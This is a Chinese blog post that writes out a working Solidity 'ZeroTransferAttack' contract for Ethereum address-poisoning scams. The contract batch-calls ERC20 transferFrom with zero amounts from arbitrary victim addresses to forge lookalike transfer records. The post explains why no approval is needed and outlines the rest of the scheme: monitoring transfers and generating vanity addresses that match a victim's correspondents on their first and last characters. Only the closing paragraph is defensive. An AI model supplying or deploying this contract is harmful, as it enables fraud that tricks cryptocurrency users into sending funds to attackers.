# 写一个 0 转账攻击合约

## 备注

时间：2024 年 7 月 7 日

作者：[33357](https://github.com/33357)

## 正文

以太坊上有大量转账 Token 数量为 0 的合约，比如这个 https://etherscan.io/address/0x6c5319df4fcca5961d71e117287c76a1f2aad593 。这些合约伪造了首尾相同的地址向用户地址转账，利用了有些人会在转账之前复制上一个地址的习惯来骗取用户资产。这里我会写一个类似功能的合约。

## 合约代码

```javascript
//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.25;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ZeroTransferAttack {
    function bacthTransferFrom(
        address[] memory tokenList,
        address[] memory fromList,
        address[] memory toList
    ) external {
        for (uint256 i; i < tokenList.length; i++) {
            IERC20(tokenList[i]).transferFrom(fromList[i], toList[i], 0);
        }
    }
}
```

很多人会奇怪，没有经过 `approve` 也能调用 `transferFrom` 吗？

是的，由于 `ERC20` 合约的 `transferFrom` 方法接受数量为 `0` 的调用，而没有授权的状态就是 `0`。因此没有经过 `approve` 授权也可以调用 `transferFrom` 生成转账记录，这大大降低了进行数量为 0 转账的操作成本。

```javascript
function transferFrom(
    address sender,
    address recipient,
    uint256 amount
) public virtual override returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(
      currentAllowance >= amount,
      "ERC20: transfer amount exceeds allowance"
    );
    _approve(sender, _msgSender(), currentAllowance - amount);

    return true;
}
```

## 攻击分析

做数量为 0 转账攻击的门槛其实不在于合约，而是对链上交易数据的爬取和计算首尾相同地址私钥。这需要完整的链上数据收集和分析，并配上有强大的 hash 计算能力。

当一个地址发起一笔转账后可以跟踪并迅速计算出首尾相同地址的私钥，调用 `transferFrom` 生成一笔发起人首尾地址相同、目标地址一样、转账时间相近的记录。如果用惯了传统的金融 APP，对复制上一个交易没有警惕性，就很容易会上这种当。

## 总结

很多 APP 为了方便用户简化了地址显示，一定程度上也给了骗子可趁之机。市场也许需要一个既方便用户，又具有唯一性的地址显示方式。